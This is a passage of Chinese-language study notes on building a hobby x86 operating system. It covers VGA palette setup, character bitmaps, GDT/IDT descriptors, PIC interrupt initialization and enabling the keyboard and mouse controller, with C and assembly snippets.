<h3 id="1-BIOS函数"><a href="#1-BIOS函数" class="headerlink" title="1) BIOS函数"></a>1) BIOS函数</h3><h4 id="1-0x10-设置画面模式"><a href="#1-0x10-设置画面模式" class="headerlink" title="(1) 0x10 设置画面模式"></a>(1) 0x10 设置画面模式</h4><ul>
<li>设置AH寄存器为00</li>
<li>设置AL寄存器为下面的值（省略部分模式）<ul>
<li>0x03: 16色字符模式，80 x 25</li>
<li>0x12: VGA图形模式，640 x 480 x 4位彩色模式，独特的4面储存模式</li>
<li>0x13: VGA图形模式，320 x 200 x 8位彩色模式，调色板模式</li>
<li>0x12: VGA图形模式，800 x 600 x 4位彩色模式，独特的4面储存模式（部分显卡不支持此模式）</li>
</ul>
</li>
<li>无返回值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 设置屏幕模式</span><br><span class="line">MOV		AL,0x13			; VGA图形，320 x 200 x 8位颜色</span><br><span class="line">MOV		AH,0x00</span><br><span class="line">INT		0x10</span><br></pre></td></tr></table></figure>

<h2 id="3-5-cpu介绍"><a href="#3-5-cpu介绍" class="headerlink" title="3.5. cpu介绍"></a>3.5. cpu介绍</h2><ul>
<li>为什么写程序使用<code>i486p</code>，这个是cpu指令集</li>
<li>i486p是给486cpu使用，但是如果只是用16位寄存器，也可以8086用</li>
<li>intel系列cpu家谱</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8086-&gt;80186-&gt;286-&gt;386-&gt;486-&gt;Pentium-&gt;PentiumPro-&gt;PentiumII-&gt;PentiumIII-&gt;Pentium4-&gt;...</span><br></pre></td></tr></table></figure>

<ul>
<li>到286为止是16位cpu，386之后为32位</li>
</ul>
<h1 id="第4天"><a href="#第4天" class="headerlink" title="第4天"></a>第4天</h1><h2 id="1-图形化界面"><a href="#1-图形化界面" class="headerlink" title="1. 图形化界面"></a>1. 图形化界面</h2><p>参考<a href="/blogs/2021-03-22-linux-kernel">linux-kernel启动过程</a></p>
<h2 id="2-调色板"><a href="#2-调色板" class="headerlink" title="2. 调色板"></a>2. 调色板</h2><ul>
<li>调色板是显卡的一个模块，由于颜色只有8位，也就是256色，但是正常RGB有24位</li>
<li>所以我们可以给显卡设置256种颜色，0-255分别表示一种颜色</li>
<li><strong><font color="red">在用的时候直接设置对应内存为一个号码，显卡就会直接将对应位置显示成对应的颜色</font></strong></li>
<li>但是cpu中断和调色板的io存取需要使用汇编来实现，c语言无法实现</li>
</ul>
<p><strong>设置调色板</strong></p>
<ul>
<li>先屏蔽中断</li>
<li>将想要设置的号码（0-255）写入到<code>0x03c8</code></li>
<li>然后按照RGB的顺序写入<code>0x03c9</code>，想要继续设定，就直接继续写就行了</li>
<li>想要读出来对应号码的RGB，将号码写入到<code>0x03c7</code>，再从<code>0x03c9</code>读取3次。同理继续读就是下一个号码</li>
<li>最后恢复中断位</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_palette</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end, <span class="type">unsigned</span> <span class="type">char</span> *rgb)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i, eflags;</span><br><span class="line">    eflags = <span class="built_in">io_load_eflags</span>(); <span class="comment">/* 记录终端许可标志的值 */</span></span><br><span class="line">    <span class="built_in">io_cli</span>();                  <span class="comment">/* 将许可标志置0，禁止中断 */</span></span><br><span class="line">    <span class="built_in">io_out8</span>(<span class="number">0x03c8</span>, start);</span><br><span class="line">    <span class="keyword">for</span> (i = start; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="built_in">io_out8</span>(<span class="number">0x03c9</span>, rgb[<span class="number">0</span>] / <span class="number">4</span>);    <span class="comment">// R</span></span><br><span class="line">        <span class="built_in">io_out8</span>(<span class="number">0x03c9</span>, rgb[<span class="number">1</span>] / <span class="number">4</span>);    <span class="comment">// G</span></span><br><span class="line">        <span class="built_in">io_out8</span>(<span class="number">0x03c9</span>, rgb[<span class="number">2</span>] / <span class="number">4</span>);    <span class="comment">// B</span></span><br><span class="line">        rgb += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">io_store_eflags</span>(eflags); <span class="comment">/* 恢复许可标志 */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第5天"><a href="#第5天" class="headerlink" title="第5天"></a>第5天</h1><h2 id="1-字符点阵"><a href="#1-字符点阵" class="headerlink" title="1. 字符点阵"></a>1. 字符点阵</h2><ul>
<li>假设一个字符占用像素点为8x16，那么可以使用<code>char[16]</code>表示一个字符的点阵</li>
<li>作者找其他人要了一个<code>hankaku.txt</code>里面包含了<code>char</code>里面所有可见字符的点阵，总共由256个字符，占用4096个字节</li>
<li>在对应的vram位置设置color就可以直接显示字符</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由hankaku.txt编译而来</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> hankaku[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 输入一个字符</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param vram 显示内存起始位置</span></span><br><span class="line"><span class="comment"> * @param xsize 屏幕的宽度，因为要换行显示，需要知道宽度</span></span><br><span class="line"><span class="comment"> * @param x 位置x</span></span><br><span class="line"><span class="comment"> * @param y 位置y</span></span><br><span class="line"><span class="comment"> * @param color 字体颜色</span></span><br><span class="line"><span class="comment"> * @param c 字符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">put_font8</span><span class="params">(<span class="type">char</span> *vram, <span class="type">int</span> xsize, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">char</span> color, <span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">char</span> *font8 = hankaku + c * <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 找到对应行的最左边</span></span><br><span class="line">        <span class="type">char</span> *p = vram + (y + i) * xsize + x;</span><br><span class="line">        <span class="type">char</span> tmp = font8[i];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((tmp &amp; (<span class="number">0x80</span> &gt;&gt; j)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                p[j] = color;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-GDT和IDT"><a href="#2-GDT和IDT" class="headerlink" title="2. GDT和IDT"></a>2. GDT和IDT</h2><h3 id="2-1-分段"><a href="#2-1-分段" class="headerlink" title="2.1. 分段"></a>2.1. 分段</h3><ul>
<li>因为操作系统可以执行多个进程，但是每个进程使用的内存是独立的，需要使用分段让每个进程使用的内存隔开</li>
</ul>
<h3 id="2-2-GDT-global-segment-descriptor-table"><a href="#2-2-GDT-global-segment-descriptor-table" class="headerlink" title="2.2. GDT: global segment descriptor table"></a>2.2. GDT: global segment descriptor table</h3><ul>
<li>全局段记录表</li>
<li>段寄存器是16位，一位一个字节。一个段描述结构体是8个字节占用3位，所以低三位不能用，只有13位，一共8192个段描述结构体组成表</li>
<li>段寄存器可以指示65536个字节（64KB），cpu没这么大内存存储，所以需要放到内存里面，我们可以任意指定一块内存，将首地址和个数信息放到GDTR寄存器中就好了</li>
<li>段描述结构体见下面定义，来自于cpu手册，一共8个字节</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">desc_struct</span> &#123;</span><br><span class="line">    u16 limit0;         <span class="comment">// 段管理的内存上限low</span></span><br><span class="line">    u16 base0;          <span class="comment">// 段的对应的内存实际地址low</span></span><br><span class="line">    u16 base1 : <span class="number">8</span>;      <span class="comment">// 段的对应的内存实际地址mid</span></span><br><span class="line">    u16 type : <span class="number">4</span>;</span><br><span class="line">    u16 s : <span class="number">1</span>;          <span class="comment">// 系统段为1，普通段为0</span></span><br><span class="line">    u16 dpl : <span class="number">2</span>;</span><br><span class="line">    u16 p : <span class="number">1</span>;</span><br><span class="line">    u16 limit1 : <span class="number">4</span>;     <span class="comment">// 段管理的内存上限low</span></span><br><span class="line">    u16 avl : <span class="number">1</span>;</span><br><span class="line">    u16 l : <span class="number">1</span>;</span><br><span class="line">    u16 d : <span class="number">1</span>;</span><br><span class="line">    u16 g : <span class="number">1</span>;          <span class="comment">// 为1就是4K为单位定义上限（上限1，管理内存4K），为0则以一个字节为单位</span></span><br><span class="line">    u16 base2 : <span class="number">8</span>;      <span class="comment">// 段的对应的内存实际地址high</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<ul>
<li>随意取内存一段地址 <code>0x00270000 - 0x0027ffff</code> 这一段存储</li>
<li>将所有段初始化成全0</li>
<li>将段号1设置位cpu管理段，在内存的地址为0，大小为4GB，为32位内管理的最大内存，可读可写</li>
<li>段号为2的设置为<code>bootpack.hrb</code>程序所在的内存段，地址在0x00280000，大小512K，可读可执行</li>
<li>最后通过汇编导出的函数写入GDTR，因为c语言无法设置GDTR</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ADR_GDT 0x00270000       <span class="comment">// GDT的内存位置</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIMIT_GDT 0x0000ffff     <span class="comment">// GDT占用的字节数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADR_BOTPAK 0x00280000    <span class="comment">// bootpack.hrb所在的地址</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIMIT_BOTPAK 0x0007ffff  <span class="comment">// bootpack.hrb最大为512k</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AR_DATA32_RW 0x4092      <span class="comment">// 数据段，可读写</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AR_CODE32_ER 0x409a      <span class="comment">// 代码段，可读可执行，不可写</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">set_segmdesc</span><span class="params">(<span class="keyword">struct</span> SEGMENT_DESCRIPTOR *sd, <span class="type">unsigned</span> <span class="type">int</span> limit, <span class="type">int</span> base, <span class="type">int</span> ar)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (limit &gt; <span class="number">0xfffff</span>) &#123;</span><br><span class="line">        ar |= <span class="number">0x8000</span>; <span class="comment">/* G_bit = 1 */</span></span><br><span class="line">        limit /= <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sd-&gt;limit_low = limit &amp; <span class="number">0xffff</span>;</span><br><span class="line">    sd-&gt;base_low = base &amp; <span class="number">0xffff</span>;</span><br><span class="line">    sd-&gt;base_mid = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    sd-&gt;access_right = ar &amp; <span class="number">0xff</span>;</span><br><span class="line">    sd-&gt;limit_high = ((limit &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>) | ((ar &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xf0</span>);</span><br><span class="line">    sd-&gt;base_high = (base &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_gdtidt</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">SEGMENT_DESCRIPTOR</span> *gdt = (<span class="keyword">struct</span> SEGMENT_DESCRIPTOR *)ADR_GDT;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">GATE_DESCRIPTOR</span> *idt = (<span class="keyword">struct</span> GATE_DESCRIPTOR *)ADR_IDT;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化GDT</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LIMIT_GDT / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> SEGMENT_DESCRIPTOR); i++) &#123;</span><br><span class="line">        <span class="built_in">set_segmdesc</span>(gdt + i, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// cpu管理的总内存</span></span><br><span class="line">    <span class="built_in">set_segmdesc</span>(gdt + <span class="number">1</span>, <span class="number">0xffffffff</span>, <span class="number">0x00000000</span>, AR_DATA32_RW);</span><br><span class="line">    <span class="comment">// bootpack.hrb的段</span></span><br><span class="line">    <span class="built_in">set_segmdesc</span>(gdt + <span class="number">2</span>, LIMIT_BOTPAK, ADR_BOTPAK, AR_CODE32_ER);</span><br><span class="line">    <span class="built_in">load_gdtr</span>(LIMIT_GDT, ADR_GDT);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-IDT-interrupt-descriptor-table"><a href="#2-3-IDT-interrupt-descriptor-table" class="headerlink" title="2.3. IDT: interrupt descriptor table"></a>2.3. IDT: interrupt descriptor table</h3><ul>
<li>中断记录表，结构定义在cpu手册中</li>
</ul>
<img src="2022-10-24-01.png" />

<ul>
<li>代码定义的结构</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">idt_bits</span> &#123;</span><br><span class="line">    u16 ist : <span class="number">3</span>;</span><br><span class="line">    u16 zero : <span class="number">5</span>;</span><br><span class="line">    u16 type : <span class="number">5</span>;</span><br><span class="line">    u16 dpl : <span class="number">2</span>;    <span class="comment">// Descriptor Privilege Level</span></span><br><span class="line">    u16 p : <span class="number">1</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">gate_struct</span> &#123;</span><br><span class="line">    u16 offset_low;         <span class="comment">// 函数在段内的偏移地址low</span></span><br><span class="line">    u16 segment;            <span class="comment">// 段配置对应的偏移，比如第2号段，就是 2 * 8，一个段配置8个字节</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">idt_bits</span> bits;</span><br><span class="line">    u16 offset_middle;      <span class="comment">// 函数在段内的偏移地址mid</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    u32 offset_high;</span><br><span class="line">    u32 reserved;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h3 id="2-4-GDT、IDT、LDT和TSS的关系"><a href="#2-4-GDT、IDT、LDT和TSS的关系" class="headerlink" title="2.4. GDT、IDT、LDT和TSS的关系"></a>2.4. GDT、IDT、LDT和TSS的关系</h3><ul>
<li>GDT，IDT都是全局的。LDT是局部的（在GDT中有它的描述符）</li>
<li>GDT用来存储描述符（门或非门）；系统中几个CPU,就有几个GDT</li>
<li>IDT整个系统只有一个</li>
<li>系统启动时候需要初始化GDT和IDT。LDT和进程相关，并不一定必有</li>
<li>TSS: Task-State Segment，任务状态段，保存任务状态信息的系统段</li>
<li>TSS只能存在于GDT中</li>
<li>Task-Gate Descriptor，任务门描述符，用来间接的宝玉引用任务。可以放到GDT、LDT、IDT中，里面的TSS段选择指向GDT的TSS描述符</li>
<li>下图为32位TSS结构</li>
</ul>
<img src="2022-10-24-03.png" />

<ul>
<li>下图为64位TSS结构</li>
</ul>
<img src="2022-10-24-02.png" />

<h1 id="第六天-中断处理"><a href="#第六天-中断处理" class="headerlink" title="第六天 中断处理"></a>第六天 中断处理</h1><h2 id="1-PIC-Programmable-interrupt-controller"><a href="#1-PIC-Programmable-interrupt-controller" class="headerlink" title="1. PIC: Programmable interrupt controller"></a>1. PIC: Programmable interrupt controller</h2><ul>
<li>可编程中断控制器</li>
<li>就是一个芯片，将8个中断信号合成一个中断信号输出给cpu</li>
<li>当前电脑上不止8个外部设备，所以使用两个pic合并成15个中断信号（主PIC的IRQ2被从PIC占据）</li>
</ul>
<img src="2022-10-23-01.png" />

<ul>
<li>PIC是外部设备，不能直接使用C语言的等于赋值，需要使用<code>io_out8</code></li>
<li>主从PIC的寄存器赋值需要使用端口进行，具体端口定义如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_ICW1 0x0020    <span class="comment">// initial controlword，初始化控制数据。用于设置中断的模式，0x11为边沿触发</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_OCW2 0x0020    <span class="comment">// 用于通知PIC已经收到某中断，0x60+IRQ号即可，IRQ1就是0x61</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_IMR 0x0021     <span class="comment">// interrupt maskregister，中断屏蔽寄存器，8位对应8路中断信号，为1就屏蔽</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_ICW2 0x0021    <span class="comment">// 中断号的起始，设置为0x20，0-7号IRQ触发的中断号为0x20-0x27</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_ICW3 0x0021    <span class="comment">// 控制主从设定，第几位为1就代表几号IRQ和从PIC相连，当前cpu写死使用0x00000100，也就是IRQ2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC0_ICW4 0x0021    <span class="comment">// 用于设置中断模式，0x01为无缓冲区模式</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_ICW1 0x00a0    <span class="comment">// 用于设置中断的模式，0x11为边沿触发</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_OCW2 0x00a0    <span class="comment">// 用于通知PIC已经收到某中断，设置这个同时也要设置PIC0_OCW2，0x62</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_IMR 0x00a1     <span class="comment">// interrupt maskregister，中断屏蔽寄存器，8位对应8路中断信号，为1就屏蔽</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_ICW2 0x00a1    <span class="comment">// 中断号的起始，设置为0x28，0-7号IRQ（对应主PIC的8-15号IRQ）触发的中断号为0x28-0x2f</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_ICW3 0x00a1    <span class="comment">// 仅用低3位表示和主设备的几号IRQ相连，当前写死为2，为主PIC的IRQ2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_ICW4 0x00a1    <span class="comment">// 用于设置中断模式，0x01为无缓冲区模式</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>0x00-0x1f</code>中断号不能使用，是cpu内部用于产生错误的中断号，所以从0x20开始</li>
<li>设置PIC的代码如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_pic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_IMR, <span class="number">0xff</span>);  <span class="comment">// 禁止所有中断</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_IMR, <span class="number">0xff</span>);  <span class="comment">// 禁止所有中断</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_ICW1, <span class="number">0x11</span>);    <span class="comment">// 边沿触发模式</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_ICW2, <span class="number">0x20</span>);    <span class="comment">// IRQ0-7由INT20-27接收</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_ICW3, <span class="number">1</span> &lt;&lt; <span class="number">2</span>);  <span class="comment">// PIC1由IRQ2连接</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_ICW4, <span class="number">0x01</span>);    <span class="comment">// 无缓冲区模式</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_ICW1, <span class="number">0x11</span>);    <span class="comment">// 边沿触发模式</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_ICW2, <span class="number">0x28</span>);    <span class="comment">// IRQ8-15由INT28-2f接收</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_ICW3, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);  <span class="comment">// PIC1由IRQ2连接</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_ICW4, <span class="number">0x01</span>);    <span class="comment">// 无缓冲区模式</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC0_IMR, <span class="number">0xfb</span>);  <span class="comment">// 11111011 PIC1以外全部禁止</span></span><br><span class="line">    <span class="built_in">io_out8</span>(PIC1_IMR, <span class="number">0xff</span>);  <span class="comment">// 禁止所有中断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-中断号对应的中断类型"><a href="#2-中断号对应的中断类型" class="headerlink" title="2. 中断号对应的中断类型"></a>2. 中断号对应的中断类型</h2><table>
<thead>
<tr>
<th>硬件中断号</th>
<th>系统中断号</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>IRQ0</td>
<td>INT20</td>
<td></td>
</tr>
<tr>
<td>IRQ1</td>
<td>INT21</td>
<td>PS&#x2F;2键盘</td>
</tr>
<tr>
<td>IRQ2</td>
<td>INT22</td>
<td>PIC1的中断</td>
</tr>
<tr>
<td>IRQ3</td>
<td>INT23</td>
<td></td>
</tr>
<tr>
<td>IRQ4</td>
<td>INT24</td>
<td></td>
</tr>
<tr>
<td>IRQ5</td>
<td>INT25</td>
<td></td>
</tr>
<tr>
<td>IRQ6</td>
<td>INT26</td>
<td></td>
</tr>
<tr>
<td>IRQ7</td>
<td>INT27</td>
<td>初始化PIC可能引发的中断</td>
</tr>
<tr>
<td>IRQ8</td>
<td>INT28</td>
<td></td>
</tr>
<tr>
<td>IRQ9</td>
<td>INT29</td>
<td></td>
</tr>
<tr>
<td>IRQ10</td>
<td>INT2a</td>
<td></td>
</tr>
<tr>
<td>IRQ11</td>
<td>INT2b</td>
<td></td>
</tr>
<tr>
<td>IRQ12</td>
<td>INT2c</td>
<td>PS&#x2F;2鼠标</td>
</tr>
<tr>
<td>IRQ13</td>
<td>INT2d</td>
<td></td>
</tr>
<tr>
<td>IRQ14</td>
<td>INT2e</td>
<td></td>
</tr>
<tr>
<td>IRQ15</td>
<td>INT2f</td>
<td></td>
</tr>
</tbody></table>
<h2 id="3-注册中断函数"><a href="#3-注册中断函数" class="headerlink" title="3. 注册中断函数"></a>3. 注册中断函数</h2><ul>
<li>也就是将中断函数地址写入idt中</li>
<li>找到对应中断号对应的idt地址，将函数地址和对应的段号放进去，设置标志位即可</li>
<li>由于中断最终要调用IRETD汇编指令退出，所以使用汇编函数调用c函数的方式来进行，并在里面存储了中断打断的进程的上下文信息</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册中断处理函数</span></span><br><span class="line"><span class="built_in">set_gatedesc</span>(idt + <span class="number">0x21</span>, (<span class="type">int</span>)asm_inthandler21, <span class="number">2</span> * <span class="number">8</span>, AR_INTGATE32);</span><br><span class="line"><span class="built_in">set_gatedesc</span>(idt + <span class="number">0x27</span>, (<span class="type">int</span>)asm_inthandler27, <span class="number">2</span> * <span class="number">8</span>, AR_INTGATE32);</span><br><span class="line"><span class="built_in">set_gatedesc</span>(idt + <span class="number">0x2c</span>, (<span class="type">int</span>)asm_inthandler2c, <span class="number">2</span> * <span class="number">8</span>, AR_INTGATE32);</span><br></pre></td></tr></table></figure>

<h2 id="4-中断处理"><a href="#4-中断处理" class="headerlink" title="4. 中断处理"></a>4. 中断处理</h2><ul>
<li>中断中尽可能少执行代码，所以将中断数据放到全局变量中，在外部进程上下文中读取变量进行处理</li>
</ul>
<h1 id="第七天-FIFO与鼠标控制"><a href="#第七天-FIFO与鼠标控制" class="headerlink" title="第七天 FIFO与鼠标控制"></a>第七天 FIFO与鼠标控制</h1><h2 id="1-鼠标键盘数据读取"><a href="#1-鼠标键盘数据读取" class="headerlink" title="1. 鼠标键盘数据读取"></a>1. 鼠标键盘数据读取</h2><ul>
<li>鼠标键盘都属于键盘控制电路，数据获取都在端口<code>0x0060</code></li>
<li>只能通过中断号来判断此端口数据是属于鼠标还是键盘</li>
</ul>
<h2 id="2-fifo"><a href="#2-fifo" class="headerlink" title="2. fifo"></a>2. fifo</h2><ul>
<li>由于中断数据可能很多，所以需要使用fifo进行存取，防止数据丢失</li>
<li>fifo自己参考linux的实现，没有使用书上的实现，具体原理查看 <a href="/bookPages/docs/linux-kernel/data-structures/kfifo/">linux源码分析-kfifo</a></li>
</ul>
<h2 id="3-鼠标初始化"><a href="#3-鼠标初始化" class="headerlink" title="3. 鼠标初始化"></a>3. 鼠标初始化</h2><ul>
<li>由于一开始鼠标并不是必须品，后来鼠标才加入</li>
<li>鼠标加入后，当时使用者并不怎么使用，为了防止频繁中断，将鼠标控制默认关闭了</li>
<li>所以想要使用鼠标，还需要进行特定操作进行激活鼠标</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PORT_KEYDAT 0x0060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT_KEYSTA 0x0064</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT_KEYCMD 0x0064</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEYSTA_SEND_NOTREADY 0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEYCMD_WRITE_MODE 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KBC_MODE 0x47</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 等待键盘控制器可以发送数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">wait_KBC_sendready</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">io_in8</span>(PORT_KEYSTA) &amp; KEYSTA_SEND_NOTREADY) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 键盘控制器的初始化</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_keyboard</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">wait_KBC_sendready</span>();</span><br><span class="line">    <span class="built_in">io_out8</span>(PORT_KEYCMD, KEYCMD_WRITE_MODE);</span><br><span class="line">    <span class="built_in">wait_KBC_sendready</span>();</span><br><span class="line">    <span class="built_in">io_out8</span>(PORT_KEYDAT, KBC_MODE);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEYCMD_SENDTO_MOUSE 0xd4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOUSECMD_ENABLE 0xf4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使能鼠标</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enable_mouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">wait_KBC_sendready</span>();</span><br><span class="line">    <span class="built_in">io_out8</span>(PORT_KEYCMD, KEYCMD_SENDTO_MOUSE);</span><br><span class="line">    <span class="built_in">wait_KBC_sendready</span>();</span><br><span class="line">    <span class="built_in">io_out8</span>(PORT_KEYDAT, MOUSECMD_ENABLE);</span><br><span class="line">    <span class="comment">// 如果成功，就会发送ACK(0xfa)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第八天-鼠标控制与32位模式切换"><a href="#第八天-鼠标控制与32位模式切换" class="headerlink" title="第八天 鼠标控制与32位模式切换"></a>第八天 鼠标控制与32位模式切换</h1><h2 id="1-鼠标数据解读"><a href="#1-鼠标数据解读" class="headerlink" title="1. 鼠标数据解读"></a>1. 鼠标数据解读</h2><ul>
<li>鼠标使能后会先发送<code>0xfa</code>数据，然后会连续三个中断发送三个字节数据</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>汇编语言学习笔记</title>
    <url>/blogs/2019-04-25-assemblyLanguage/</url>
